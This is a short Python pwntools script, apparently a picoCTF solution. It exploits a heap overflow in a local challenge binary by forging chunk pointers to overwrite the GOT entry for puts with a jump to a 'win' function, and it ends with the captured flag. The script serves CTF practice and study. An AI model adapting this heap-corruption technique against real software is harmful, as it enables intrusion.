from pwn import *

elf = ELF('./heapoverflow')

p = process('./heapoverflow')
# gdb.attach(p)
p.recvuntil('decimal...\n')
leak = int(p.recvline()[:-1])


fd = leak + 664 + 8 + 8
bk = elf.got['puts'] - 8

code = asm('mov eax,0x{:x}\njmp eax'.format(elf.symbols['win']))

payload = "\x00"*664
payload += p32(0)
payload += p32(0x101)
payload += p32(fd) + p32(bk)
payload += code.ljust(8,'\x90')
payload += '\x00'*(0x100-16)
payload += p32(0x100)
payload += p32(0xff)

p.sendlineafter('Input fullname\n', payload)

p.sendlineafter('Input lastname\n', '')


p.interactive()

# picoCTF{a_s1mpl3_h3ap_69424381}